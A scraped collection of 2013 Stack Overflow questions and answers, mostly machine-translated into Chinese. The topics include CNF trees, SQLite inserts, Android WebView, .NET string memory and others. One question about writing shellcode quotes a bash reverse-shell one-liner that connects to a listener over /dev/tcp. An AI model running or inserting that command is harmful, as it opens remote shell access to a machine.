**更新 2**：得到了我的问题的[答案](https://github.com/appliedsec/pygeoip/issues/34#issuecomment-16614353)。有[单独的 GeoIP 数据库](http://dev.maxmind.com/geoip/downloadable#Binary-Databases-1)，可以在这里找到[Org 版本](https://www.maxmind.com/en/organization)，但似乎要花钱。我不确定 Python 中是否有免费的替代品，或者有人共享他们的 API。如果没有，我的 hacky 解决方案可能就是它。

# assembly - pass arguments to execve program in shellcode

> ID：16091382
> 
> 赞同：2
> 
> 时间：2013-04-18T19:21:47.720
> 
> 标签：assembly, shellcode, execve

I'm having a go at learning assembly and writing shellcode. I have a question about `execve` and passing arguments to the program it will execute.

I have working code to execute a bash shell but am unsure of the input format of `execve` to pass additional arguments to it. Can I do stdin stdout redirects too? I wanted to create a reverse tcp connection with this type of command line:

```
/bin/bash -i >& /dev/tcp/192.168.1.4/1234 0>&1

```

Should the arguments be separated with NULL's? I got it to execute a shell but it didn't connect back to the listening nc.

I know this is an unusual way of doing this but I just wanted to try something different :-)

Cheers

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T12:59:11.090

知道如何做的最好方法是编译一个示例并在汇编级别停止。让我们举这个例子：

```
#include <unistd.h>

int
main ()
{
  char *program = "/bin/ls";
  char *args[3] = {"/bin/ls", "-l", "./"};

  execv(program, args);

  return 0;
} 
```

编译后，`gcc -Wall -Wextra -S -o myexec.s myexec.c`您可以阅读`myexec.s`：

```
 .file   "myexec.c"
        .section        .rodata
.LC0:
        .string "/bin/ls"
.LC1:
        .string "-l"
.LC2:
        .string "./"
        .text
        .globl  main
        .type   main, @function
main:
.LFB0:
        pushq   %rbp
        movq    %rsp, %rbp
        subq    $32, %rsp
        movq    $.LC0, -8(%rbp)
        movq    $.LC0, -32(%rbp)
        movq    $.LC1, -24(%rbp)
        movq    $.LC2, -16(%rbp)
        leaq    -32(%rbp), %rdx
        movq    -8(%rbp), %rax
        movq    %rdx, %rsi
        movq    %rax, %rdi
        call    execv
        movl    $0, %eax
        leave
        ret 
```

因此，命令行的参数列表由字符串列表组成，第一个参数是可执行文件的路径 ( `-8(rbp)`)，然后每个参数通过指向其字符串的指针传递：`argv[0] = -16(%rbp)`, `argv[1] = -24(%rbp)`, `argv[2] = -32(%rbp)`, ...等等。

因此，您只需要在调用`execv`.

# c++ - 如何将命题逻辑树转换为合取范式 (CNF) 树

> ID：16091386
> 
> 赞同：4
> 
> 时间：2013-04-18T19:22:01.047
> 
> 标签：c++, c, recursion, conjunctive-normal-form, prefix-tree

我有一个类似字符串的字符串

```
 s="(=> P (OR (AND A (NOT B)) (AND B (NOT A))))"; 
```

并将其转换为输出此字符串的 CNF，例如

（或（非 P）（或 AB））（或（非 P）（或（非 B）（非 A）））

我需要制作一个结构 TreeNode 来保持价值吗？

```
 struct TreeNode {
            string val;         // The data in this node.
            TreeNode *left;   // Pointer to the left subtree.
            TreeNode *right;  // Pointer to the right subtree.
            //TreeNode *farther;//should I use farther or not in convert to CNF?
      }; 
```

如何使其成为合取范式的CNF？请给出一些算法细节。从我的角度来看，也许使用递归函数更好地解决这个问题，但我仍然想不出如何使用递归。或者您有其他解决此问题的建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:45:20.430

假设您为函数命名`CNF`，取一棵树并在 CNF 中返回该树。

1.  首先，将等价替换`p<=>q`为，`AND(p=>q,q=>p)`然后将蕴涵替换`p=>q`为`OR(q,NOT(p))`。

2.  转换为否定范式：将所有`NOT`操作向下移动，以便`NOT`操作仅绑定到原子 ( `A`, `B`)。

3.  然后，结果`CNF(AND(x,y))`很简单： ，因为在树`AND(CNF(x),CNF(y))`中有 s 高就像 CNF 。`AND`

4.  结果`CNF(OR(AND(x,y),z))`有点复杂。这里我们将使用析取大于合取的分布规则，它`OR(AND(x,y),z)`等价于`AND(OR(x,z),OR(y,z))`。实际上，`CNF(OR(AND(x,y),z))`将是`AND(OR(CNF(x),CNF(z)),OR(CNF(y),CNF(z))`。

你完成了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:50:19.573

简单的递归下降解析器解决方案：

`TreeNode* ParseExpression(const char*& p)`: 如果 p 指向的字符串不是以 '(' 开头，则返回 ParseAtom(p)，否则将 p 移过 '('，调用 ParseOperation(p)，然后将 p 移过 ')' 并返回返回值通过 ParseOperation。

`TreeNode* ParseAtom(const char*& p)`：跳过 p 过去的原子（连续的非空格系列）。返回一个以原子为值且左右为 NULL 的 TreeNode。

`TreeNode* ParseOperation(const char*& p)`: p 指向的字符串应该以操作符开头。将 p 移过运算符，然后确定运算符需要多少个操作数。如果有，则调用 ParseExpression(p) 一次；如果两个，调用 ParseExpression(p) 两次。然后返回一个 TreeNode，其操作符为值，一两次 ParseExpression 调用的结果为左和右（对于只有一个操作数的操作符，右应为 NULL）。

设置一个指向原始字符串的指针；在该指针上调用 ParseExpression；返回值是您的树，指针将指向字符串中的第一个表达式。

这解决了您的一个问题：如何将字符串变成树。Adrian Panasiuk 解决了另一个问题，即如何将树转换为正常形式。由于您将进行额外的树转换，因此节点中的“值”应该称为“op”或类似的名称来代表“运算符”（这是 C++ 中的保留字），它应该是一个枚举，而不是字符串。

# android - Sqlite 不喜欢我的二值插入查询什么？

> ID：16091388
> 
> 赞同：0
> 
> 时间：2013-04-18T19:22:10.040
> 
> 标签：android, sqlite, sql-insert

我正在尝试在单个查询中将两行值插入到仅两列中，遵循这个装饰精美的问题，[在单个 SQL 查询中插入多行？](https://stackoverflow.com/questions/452859/inserting-multiple-rows-in-a-single-sql-query)，但是用我的代码

```
DatabaseHelper helper = new DatabaseHelper(RegisterActivity.this);
database = helper.getWritableDatabase();
database.query("usersdata", fields, null, null, null, null, null);
database.rawQuery("INSERT INTO usersdata ( userName, userType ) VALUES " + "( '" +   firstTime + "' , 'flag' ) , ( '" + name + "' , 'Owner' )", null);
database.close(); 
```

我收到错误

```
android.database.sqlite.SQLiteException: near ",": syntax error: , while compiling: INSERT INTO usersdata ( userName, userType ) VALUES ( 'hasBeenRegistered' , 'flag' ) , ( 'kwish' , 'Owner' ) 
```

看来我的引号不是问题，因为它说：在“，”哪个“，”附近有问题，我不知道...我也尝试过引号后没有空格-不是那应该很重要。对此的任何帮助将不胜感激！TIA（现在看到我不需要连接 VALUES 和（，但这也不重要！）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:29:03.573

根据[文档](http://developer.android.com/reference/android/database/sqlite/package-summary.html)，Android 附带 SQLite 3.4.0。[直到SQLite 3.7.11](http://www.sqlite.org/releaselog/3_7_11.html)才支持您想要做的事情。

你必须像这样重写（来自这个[答案](https://stackoverflow.com/questions/1609637/is-it-possible-to-insert-multiple-rows-at-a-time-in-an-sqlite-database)）：

```
INSERT INTO 'tablename'
      SELECT 'data1' AS 'column1', 'data2' AS 'column2'
UNION SELECT 'data3', 'data4'
UNION SELECT 'data5', 'data6'
UNION SELECT 'data7', 'data8' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:31:45.233

这里只是一个猜测，但您引用的帖子专门关于 SQLServer。SQLite 很可能不支持单个查询中的多行插入 - 或者可能不支持相同的语法。看看这里 -[是否可以在 SQLite 数据库中一次插入多行？](https://stackoverflow.com/questions/1609637/is-it-possible-to-insert-multiple-rows-at-a-time-in-an-sqlite-database)

# selenium - Getting error as "Error! The first argument to the non-static Java function 'replace' is not a valid object reference"

> ID：16091392
> 
> 赞同：1
> 
> 时间：2013-04-18T19:22:21.533
> 
> 标签：selenium

Getting error as "Error! The first argument to the non-static Java function 'replace' is not a valid object reference" while generating the Junit report in eclipse. my system configuration is: Windows 8, JDK1.7

Please if any one knows answer, reply me.

Thanks in advance

# android - 将网站中的图像保存在 WebView 中？

> ID：16091393
> 
> 赞同：0
> 
> 时间：2013-04-18T19:22:23.887
> 
> 标签：android, image, webview, save

我四处搜索，大多数答案都与静态图像有关，即只有一张图像，并且 URL 已经预先定义。

我设置了一个 WebView 来将用户带到一个充满照片的网站。我希望用户能够按住图像并选择将其保存到手机。那可能吗？我当然不知道 URL 或任何东西，因为图像每天都在变化，而且数量很多。

如果这有什么不同的话，网站上的图片都有自己的页面。它只是一个带有图像的网站。无需身份验证。就像在桌面上您可以右键单击并保存图像一样，我可以使用 WebView 来做到这一点吗？必须有一种方法，因为它在默认浏览器中是可能的。

编辑：我一直在使用一个名为“Reddit 很有趣”的应用程序，它具有此功能，从表面上看，它看起来像一个带有操作栏的简单 WebView，所以我认为这是可能的。

我将不胜感激这件事的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T22:14:10.700

是的，我想通了。

使用上下文菜单，我可以按住图像以提取其 URL。然后我可以让它使用 DownloadManager 启动下载。那一点是不言自明的，所以我将展示获取图像 URL 的代码。

```
public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
    // Confirm the view is a webview
    if (v instanceof WebView) {                
        WebView.HitTestResult result = ((WebView) v).getHitTestResult();

        if (result != null) {
            int type = result.getType();

            // Confirm type is an image
            if (type == WebView.HitTestResult.IMAGE_TYPE || type == WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE) {
                String imageUrl = result.getExtra();
                Toast.makeText(this, imageUrl, Toast.LENGTH_LONG).show();

            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:41:22.310

我认为一个不错的解决方案是将javascript与[WebView.addJavascriptInterface(Object,String)](http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29)结合使用，以便在渲染图像和您的活动之间建立“桥梁”。关于这种方法的一篇不错的文章在[这里](http://android-developers.blogspot.it/2008/09/using-webviews.html)。

本质上，您应该能够通过 javascript 拦截每个图像 url 上的保持事件，然后您应该通过上述方法将此类信息发送到您的 Activity 以执行您想做的任何事情。

# java - 为什么当我调用另一个类的构造函数时会出现空指针异常？

> ID：16091395
> 
> 赞同：0
> 
> 时间：2013-04-18T19:22:30.210
> 
> 标签：java, swing, layout-manager

```
case "Login":
        try {
            restoreUserInfo();
            String email = textf1.getText();
            String password = new String(jpass1.getPassword());
            if (hm.containsKey(email)) {
                if (hm.get(email).getPassword().equals(password)) {
                    showMessageDialog(this, "Successfully login");

                    ch = new Chat_Window("lets chat!!");
                    System.out.println("after call");

                } else {
                    showMessageDialog(this, "Invalid Password");
                }
            } else {
                showMessageDialog(this, "Invalid Login ID and Password");
            }
        } catch (Exception exc) {
            System.out.println("Invalid file");
            exc.printStackTrace();
        } 
```

为什么当我调用“ch = new Chat_Window("lets chat!!");”时会出现空指针异常？Chat_window 类在同一个包中可用，并且具有匹配的构造函数，代码如下：

```
public Chat_Window(String title){
    super(title);
    setSize(500, 500);
    getContentPane().setBackground(Color.LIGHT_GRAY);
    setLocationRelativeTo(null);
    setResizable(false);
    c1=new JPanel();
    c2=new JPanel();
            lbl=new JLabel("Type Here:");
    c1.add(lbl, new GridLayout(1, 2, 50, 50));
    ta=new JTextArea(03,30);
    c1.add(ta,new GridLayout(1, 2, 50, 50) );
    c1.add(send_but,new GridLayout(1, 2, 50, 50));
    add(c1, BorderLayout.PAGE_END);
    send_but=new JButton("Send");
            setDefaultCloseOperation(EXIT_ON_CLOSE);
    setVisible(true);

} 
```

请帮忙！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:28:19.340

`send_but`在创建之前添加。

```
c1.add(send_but,new GridLayout(1, 2, 50, 50));  // send_but is null here
add(c1, BorderLayout.PAGE_END);
send_but=new JButton("Send"); 
```

# iframe - Getting the URL address from an IFrame on my site with PHP

> ID：16091396
> 
> 赞同：0
> 
> 时间：2013-04-18T19:22:33.703
> 
> 标签：iframe

I have a simple IFrame of another site in my site:

```
 <iframe name="frame1" src="http://www.walla.co.il" width="100%" height="400"></iframe> 
```

That site doesn't belong to me in any way. I was looking for way go get the exact URL address of that site and post it as an echo so viewers could see the address of that site on my site. I found some scripts online but they didnt seem to work.

Is it even possible to do it? I am just looking for a way to echo it a variable (something like echo $url;)

This is what i've tried so far:

```
 <iframe name="frame1" src="http://www.walla.co.il" width="100%" height="400"></iframe>

    <?php
    $htmlPage = file_get_contents("http://www.walla.co.il"); //the page has the iframe

    if(preg_match_all("/<iframe[^>]*name=\"frame1\"[^>]*src=\"([^\"]+)\"[^>]*>/i", $htmlPage, $matches))
    {
        print_r($matches);
        echo $matches[1][0];
    }
    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:27:48.130

是的，你可以这样做：

```
$htmlPage = '<iframe name="frame1" src="http://www.walla.co.il" width="100%" height="400"></iframe>'; //the page has the iframe

if(preg_match_all("/<iframe[^>]*name=\"frame1\"[^>]*src=\"([^\"]+)\"[^>]*>/i", $htmlPage, $matches))
{
    //print_r($matches);
    echo $matches[1][0];
} 
```

虽然这没有经过测试......

编辑：我不知道你想在这里完成什么，但你不能那样做。iframe 的 html 字符串应该在一个变量中。类似于查看更新的答案...

# php - Webapp creates file with strange Group Name

> ID：16091400
> 
> 赞同：0
> 
> 时间：2013-04-18T19:22:47.093
> 
> 标签：php, linux, file-permissions

I'm having trouble with my website/application setting strange Group names to new files.

Whenever I create a new file from my website (a log file, txt file, anything) it sets the User as webapp (correctly), but the Group name as `4294967295`

If I use terminal to ssh into my instance and try to get some data on that user it doesn't return anything. For example,

```
$ sudo groups 4294967295
groups: 4294967295: No such user 
```

Further, I can't add this mystery group to any of my other users.

This is making things difficult because I have to run my cron jobs as a different user and I would like to let them both write to the same log (so they both must share a group).

I recognize that it's strange (and maybe meaningful) that 4294967295 is the highest number one can reach with 32 bits.

Any ideas or suggestions? I don't have an extensive linux background and haven't had much luck searching for answers.

I'm using Amazon AWS and an ec2-instance.

Thanks.

Additional Info:

How'd I get that group name?

```
ls -l
-rwxrwxr-x 1 webapp 4294967295  8347 Apr 16 17:35 log_2013-04-16.txt

groups 4294967295
groups: 4294967295: No such user 
```

Additional Info #2:

```
$ file /bin/ls
/bin/ls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=0x083f0a5a25fb311dae23412bcc79f384a865e7d4, stripped

$ groups webapp
webapp : webapp ec2-user 
```

Additional Info #3:

```
$ cat group
root:x:0:
bin:x:1:bin,daemon
daemon:x:2:bin,daemon
sys:x:3:bin,adm
adm:x:4:adm,daemon
tty:x:5:
disk:x:6:
lp:x:7:daemon
mem:x:8:
kmem:x:9:
wheel:x:10:ec2-user
mail:x:12:mail
uucp:x:14:
man:x:15:
games:x:20:
gopher:x:30:
video:x:39:
dip:x:40:
ftp:x:50:
lock:x:54:
audio:x:63:
nobody:x:99:
users:x:100:
utmp:x:22:
utempter:x:35:
cdrom:x:11:
tape:x:33:
dialout:x:18:
floppy:x:19:
ec2-user:x:500:webapp
saslauth:x:76:
mailnull:x:47:
smmsp:x:51:
ssh_keys:x:499:
ntp:x:38:
sshd:x:74:
tcpdump:x:72:
screen:x:84:
dbus:x:81:
webapp:x:501:ec2-user
apache:x:48: 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:26:07.860

首先，您`groups`以错误的方式使用 cmd。像这样使用它：

```
groups webapp_user 
```

它会给你 webapp_user 所属的组。

* * *

我预计组名设置为 2^32 是一个显示问题，或者您以错误的方式检索组名。你能解释一下你是如何得到 2^32 的吗？有源代码吗？

# c# - 加载多个远程 RSS 提要的最佳方式是什么？

> ID：16091401
> 
> 赞同：1
> 
> 时间：2013-04-18T19:22:47.970
> 
> 标签：c#, asynchronous, rss, task-parallel-library, async-await

我正在做一个项目，我需要加载多个（100 多个）远程 RSS 提要，解析它们并查询一些关键字。显然这个过程很耗时，我正在寻找实现这一点的最佳方法。

我当前的实现同步加载提要，因为 TPL 的异步实现失败了，因为在这个过程中创建了很多任务，最后它抛出了一个异常。

加载远程提要的异步部分如下所示：

```
/// <summary>
/// Loads the specified URL.
/// </summary>
/// <param name="url">The URL.</param>
/// <returns></returns>
/// <exception cref="ScanException">Unable to download rss feed from the specified url. Check the inner exception for more details.</exception>
protected async Task<XDocument> Load(string url)
{
    XDocument document = null;

    try
    {
        using (var client = new HttpClient())
        {
            HttpResponseMessage response = await client.GetAsync(url);

            if (response.IsSuccessStatusCode)
            {
                string content = await response.Content.ReadAsStringAsync();
                document = XDocument.Parse(content);
            }
        }
    }
    catch (Exception ex)
    {
        throw new ScanException(url, "Unable to download rss feed from the specified url. Check the inner exception for more details.", ex);
    }

    return document;
} 
```

我希望你们能指出我正确的方向，这样我就可以让它正常工作（性能方面）。

最后一个问题是：加载多个远程 RSS 提要的最佳方式是什么？

**测试代码**

```
/// <summary>
        /// Reads the feeds by batch async.
        /// </summary>
        /// <param name="feeds">The feeds.</param>
        public void ReadFeedsByBatchAsync(string[] feeds, TorrentStorage storage, int batchSize = 8)
        {
            var tasks = new List<Task>(batchSize);
            var feedsLeft = feeds.Length;

            foreach (string feed in feeds)
            {
                var readFeedTask = this.client.GetStringAsync(feed);

                if (readFeedTask.Status == TaskStatus.RanToCompletion)
                {
                    XDocument document = XDocument.Parse(readFeedTask.Result);
                    var torrents = ProcessXmlDocument(document);

                    storage.Store(torrents);
                }

                tasks.Add(readFeedTask);
                --feedsLeft;

                if (tasks.Count == tasks.Capacity || feedsLeft == 0)
                {
                    var batchTasks = tasks.ToArray();
                    tasks.Clear();

                    try
                    {
                        Task.WaitAll(batchTasks);
                    }
                    catch (Exception)
                    {
                        throw;
                    }
                }
            }

        } 
```

![没有结果属性](https://i.stack.imgur.com/agUpA.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:12:11.753

我已经在我的 GitExtensions 分支中解决了类似的问题。我通过创建任务来分批 8 个 REST API 调用，并为每批 8 个任务执行一个 Task.WaitAll。这有点简单，但它可以在不使代码过于复杂的情况下完成这项工作：

[https://github.com/PombeirP/gitextensions/blob/BuildServerIntegration/Plugins/BuildServerIntegration/TeamCityIntegration/TeamCityAdapter.cs#L178](https://github.com/PombeirP/gitextensions/blob/BuildServerIntegration/Plugins/BuildServerIntegration/TeamCityIntegration/TeamCityAdapter.cs#L178)。

我建议的一件事是重用 HttpClient 类。总是为每个请求创建一个新实例似乎有点矫枉过正。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T22:22:54.460

恕我直言，当您遇到这样的问题时，最简单的方法是编写同步代码，然后在输入集合上编写 Parallel.ForEach。

它不是线程友好的，但您可以非常简单地设置最大并行度，包括在调试期间将其设置为 1。:)

# jquery - jquery custom validation method with a callback

> ID：16091405
> 
> 赞同：2
> 
> 时间：2013-04-18T19:23:08.343
> 
> 标签：jquery, jquery-validate

So I just found that you can add any custom validation logic. If it's simple enough it's not a problem, right?

```
$.validator.addMethod('customRule',function(val, el){
    return val > 2;
},'value cannot be smaller than 2');

$('#myInput').rules('add', { customRule : true }); 
```

now, even if you have something a little bit more difficult (a REST call for example) it still can be done:

```
$.validator.addMethod('customRule',function(val, el){
    var validator = this;
    $.get('checkValueOnServer',val).done(function(isValid){
        if(!isValid){
           var errors = {}; 
           errors[el.name] = 'server says: value does not look right!';
           validator.showErrors(errors);
        }
        validator.stopRequest(el, isValid);
    })
    return 'pending';
},''); 
```

now, in my case I need to call a function with a callback, something like that

```
$.validator.addMethod('customRule',function(val, el){
    var validator = this;
    checkValueOnServer(el, function(isValid){ // so function runs for a few secs and returns a callback with a result 
        if(!isValid){
           var errors = {}; 
           errors[el.name] = 'called function says: value does not look right!';
           validator.showErrors(errors);
        }
        validator.stopRequest(el, isValid);
    });
    return 'pending';
},''); 
```

You see just a good old callback, not `deferred` object. So in the later case if I call

`$('form').valid()` it reports it's true, although custom called function reports that the validation rule didn't pass and the element is highlighted and error message is shown. So what's wrong? What's the right way to tell that thing: the form is invalid?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T21:14:35.150

使用自定义验证方法时，该函数通常只返回 a`true`或 a `false`。

*   如果您的自定义验证函数返回`true`，则该元素通过了验证并且没有触发错误消息。 [http://jsfiddle.net/kCqy5/1/](http://jsfiddle.net/kCqy5/1/)

*   如果您的自定义验证函数返回`false`，则元素验证失败并显示错误消息。 [http://jsfiddle.net/kCqy5/2/](http://jsfiddle.net/kCqy5/2/)

*   如果您的自定义验证函数不返回`true`or `false`，那么结果似乎不是很可预测。 [http://jsfiddle.net/kCqy5/](http://jsfiddle.net/kCqy5/)

您的仅返回一个包含 text 的字符串，`'pending'`即使`required`表单通过验证也会显示错误消息。您的使用超出了文档的范围...

* * *

[根据文档](http://docs.jquery.com/Plugins/Validation/Validator/addMethod#namemethodmessage)：

> **method** Callback
> 实际的方法实现，**如果元素有效则返回 true**。第一个参数：当前值。第二个参数：经过验证的元素。第三个参数：参数。

# .net - How to implement string with 1 byte char (and save memory)

> ID：16091406
> 
> 赞同：0
> 
> 时间：2013-04-18T19:23:17.420
> 
> 标签：.net, string, character-encoding

How to implement a single byte based string?

Application uses a large list of words.
Words come from SQL and is varchar (single byte).
Each word also has in Int32 ID.
Download the words to:

```
Dictionionary<Int32,string> 
```

for performance.

Problem is the Dictionary gets so large that will get an out of memory exception.
We end up splitting up the data.
The app hits the list so much that hitting SQL for each request is not an option.
The database is already very active.
Dynamically paging into and out of the Dictionary is not an option - it is bound to ListView and with virtualiztion works great.
Words are only loaded at night - the user just needs a static list.
They use the words to search and process other data but they don't process the words.

Since it is char thought could just implement a single byte based word:

```
public class StringByte1252 : Object, IComparable, IComparable<StringByte1252>
{
    static Encoding win1252 = Encoding.GetEncoding("Windows-1252");

    public Int32 ID { get; private set; }
    public byte[] Bytes { get; private set; }

    public string Value { get { return win1252.GetString(Bytes); } }
    public Int32 Length { get { return Bytes.Length; } }

    public int CompareTo(object obj)
    {
        if (obj == null)
        {
            return 1;
        }
        StringByte1252 other = obj as StringByte1252;
        if (other == null)
        {
            throw new ArgumentException("A StringByte1252 object is required for comparison.", "obj");
        }
        return this.CompareTo(other);
    }
    public int CompareTo(StringByte1252 other)
    {
        if (object.ReferenceEquals(other, null))
        {
            return 1;
        }
        return string.Compare(this.Value, other.Value, StringComparison.OrdinalIgnoreCase);
    }
    public override bool Equals(Object obj)
    {
        //Check for null and compare run-time types.
        if (obj == null || !(obj is StringByte1252)) return false;
        StringByte1252 item = (StringByte1252)obj;
        return (this.Bytes == item.Bytes);
    }
    public override int GetHashCode() { return ID; }

    public StringByte1252(Int32 id, byte[] bytes) { ID = id; Bytes = bytes; } 
} 
```

This above works but it is NOT more memory efficient than

```
Dictionionary<Int32,string> 
```

Dictionary with Int16 based characters actually uses slightly less memory.

Where did I go wrong?
Does a byte array take more space than the sum of the bytes?
Is there a way to achieve single byte string?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:43:17.740

一个数组在 64 位运行时大约有 50 个字节的开销。在 32 位运行时，它会少一点：可能是 40 字节。有标准的 .NET 分配开销（64 位运行时为 24 个字节），然后是数组的所有元数据：维数、长度等。您不能通过使用单个字节数组存储短来节省内存字符串。

一种方法是分配一个非常大的字节数组并将字符串存储在该数组中，UTF-8 编码。你的字典变成了一个`Dictionary<int,int>`，它`Value`是数组的索引。

[我在我的文章Reducing Memory Required for Strings](http://www.informit.com/guides/content.aspx?g=dotnet&seqNum=832)中展示了如何做到这一点。通过这种方式，我能够比正常的字符串分配节省大约 50%。有关更多详细信息，请参阅文章。

另一个问题是`Dictionary`开销大约是每个条目 24 个字节。如果你有一大堆小物件，那是相当昂贵的。您可以考虑改为制作结构列表，按 ID 对其进行排序，并使用二进制搜索。给你的不是 O(1) 访问`Dictionary`，但对于用户界面来说，它可能足够快。然后，您的开销将是每个条目 8 个字节。

该结构将类似于：

```
struct WordEntry
{
    public readonly int Id;
    public readonly int IndexIntoStringTable;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:43:41.570

尽管 char 是字节大小的两倍，但如果字符串很长，您只会在内存占用方面获得显着差异。

内存以块的形式分配，例如 16 字节（可能因平台和实现而异）。这意味着一个字符长的字符串可能占用与六个字符长的字符串一样多的内存，因为两者都需要两个内存块来保存字符数据和字符串对象的开销。

考虑到字典中引用的开销、字符串对象的开销以及部分未使用的内存块的开销，平均而言，您需要在字符串中放入大约 16 个字符，然后才会有不到 50% 的开销。

由于开销如此之大，仅通过减小数据大小来减少内存占用是很困难的。

您可能会寻找一种解决方案，其中每个项目的开销较小，例如一个用于字符数据的巨型字符串（或字节数组），并为该大字符串中的每个字符串指定起始索引。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:33:07.600

由于数组的构建方式，字节数组肯定会占用更多/与其内容之和一样多的空间。数组由特定大小的块组成。确实能够区分数组的不同元素，元素必须有固定的大小，所以数字不会混淆。这就像说您要存储最多 9999 的十进制数，因此为了能够“一起”存储它们，您必须使用前导零来填补空白，例如：1,5,32,1293,12 = 00010005003212930012。一个词是由字符组成的。为了能够表示一个字符，您需要找到可能使用的最少字符数，并从中定义数组的基本构造单元。由于字母表有26个字符，大写和小写加起来是52个，使用其他符号，您可能会得到少于 128 个可能性，从而导致您选择 7 位。内存由 8 位块（字节）组成，因此您应该解决这些问题并使用 ASCII 进行编码，或者找到一种方法来处理数据，以便每个字符仅使用 7 位，并且每第 8 个字符保存一个字节。我想有一些开放的解决方案，虽然我不知道。

字符串只是一个字符数组。在 c 中，字符串是 byte[]。尝试使用 byte[] 数组。

由于我目前正在运行 linux，因此我发现很难测试，但您也可以尝试使用：

```
byte[] bytes = Encoding.ASCII.GetBytes("Hello World!"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-23T21:13:19.430

得出的结论是，一个简单的结构是将 char 存储为单字节的最佳内存执行者。

这是我的假设。
内存一次分配 4 个字节。
单个变量末尾的字节或不在 4 字节边界上的数组都被浪费了。

字节池消除了单个单词上浪费的字节，但代价是对池起点和字长的索引。

假设即使是字典 Int32，字符串也有浪费。
任何奇数长度的字符串都会浪费 16 个字节。

考虑 Int32 单词索引。
Int32 浪费了 1 个字节。
在池的情况下，池索引只有 Int32，所以很明显它不能保存 Int32 字。
对于 .NET 中的对象大小，有 4 GB 的限制。
字加索引的最佳情况是 8 个字节。
32(4GB) - 8 = 24
最大字数加索引数为 2 ** 24 = 16,777,216。

该结构使用索引中的一个字节作为一个字符。
一个字节就是一个字节。该结构不必存储长度，因为它可以从内容中导出长度。

```
public struct Word1252bytes 
{
    static Encoding win1252 = Encoding.GetEncoding("Windows-1252");
    private UInt64 packed;
    private byte[] bytes;
    public Int32 Key { get { return (Int32)(packed & ((1 << 24) - 1)); } }
    private byte[] Bytes
    {
        get
        {
            // yes a lot of work to salage just one byte out of the key 
            // but a byte is a byte and the design objective is size
            byte[] bytesT = new byte[Length];
            bytesT[0] = (byte)((packed >> 24) & ((1 << 8) - 1));
            for (int i = 0; i < bytes.Length; i++) bytesT[i + 1] = bytes[i];
            return bytesT;
        }
    }
    public Int32 Length { get { return bytes.Length + 1; } }
    public String Value
    {
        get
        {
            return win1252.GetString(Bytes);
        }
    }
    public Word1252bytes(UInt64 Packed, byte[] Bytes) 
    { 
        packed = Packed;
        bytes = Bytes;
    }
} 
```

如何打包

```
pack32 = (UInt32)(bits24wordI) | ((UInt32)charB[0] << 24);
byte[] bytesT = new byte[bits8wLen - 1];
for (int i = 1; i < bits8wLen; i++) bytesT[i - 1] = charB[i];
iWordsList.Add(new Word1252bytes(pack32, bytesT)); 
```

它快速补水。我的测试用例是 600 万字，Word1252bytes 的构建速度和字典一样快（大约 20 秒）

大小对比。
用字节池可以使用一个字节的字索引作为字长。
这将字长限制为 256，但在字符串池中节省了空间。

上述结构在每个单词大小上都与所述假设相关。索引是索引的大小。对于 Dict 和上述结构，它是 32。
对于字节池，它是 64 - 单词索引和池索引。
浪费是不在 4 字节边界上的字节。

```
 Index   Content Waste   Total
exactly 1               
dict16  dict16  32  16      16  64
word8   pool    64  8           72
word8   imbed   32  0       0   32

exactly 2               
dict16  dict16  32  32      0   64
word8   pool    64  16          80
word8   imbed   32  8       24  64

exactly 3               
dict16  dict16  32  48      16  96
word8   pool    64  24          88
word8   imbed   32  16      16  64

exactly 4               
dict16  dict16  32  64      0   96
word8   pool    64  32          96
word8   imbed   32  24      8   64

exactly 5               
dict16  dict16  32  80      16  128
word8   pool    64  40          104
word8   imbed   32  32  0   64

exactly 6               
dict 16 dict16  32  96      0   128
word 8  pool    64  48          112
word 8  imbed   32  40      24  96

exactly 7               
dict 16 dict16  32  112     16  160
word 8  pool    64  56          120
word 8  imbed   32  48      16  96

exactly 8               
dict 16 dict16  32  128     0   160
word 8  pool    64  64          128
word 8  imbed   32  56      8   96

exactly 9               
dict 16 dict16  32  144     16  192
word 8  pool    64  72          136
word 8  imbed   32  64      0   96

exactly 10              
dict 16 dict16  32  160      0  192
word 8  pool    64  80          144
word 8  imbed   32  72       24 128

exactly 254             
dict 16 dict16  32  4064    0   4096
word 8  pool    64  2032        2096
word 8  imbed   32  2024    24  2080

exactly 255             
dict 16 dict16  32  4080    16  4128
word 8  pool    64  2040        2104
word 8  imbed   32  2032    16  2080

exactly 256             
dict 16 dict16  32  4096    0   4128
word 8  pool    64  2048        2112
word 8  imbed   32  2040    8   2080

exactly 257             
dict 16 dict16  32  4112    16  4160
word 8  pool    64  2056        2120
word 8  imbed   32  2048    0   2080 
```

字节池可以压缩的地方是搜索池中已经存在的字符串。在小字符串上，池处于 30% 的劣势，因此它需要有很高的匹配率。在较大的字符串上，找到匹配项的机会很低。问题是搜索时间。在超过 1,000,000 的列表中，即使 10 毫秒的搜索时间也是 10,000 秒 = 2.78 小时。

# mysql - 分布式应用程序中的 Django 查询集

> ID：16091408
> 
> 赞同：0
> 
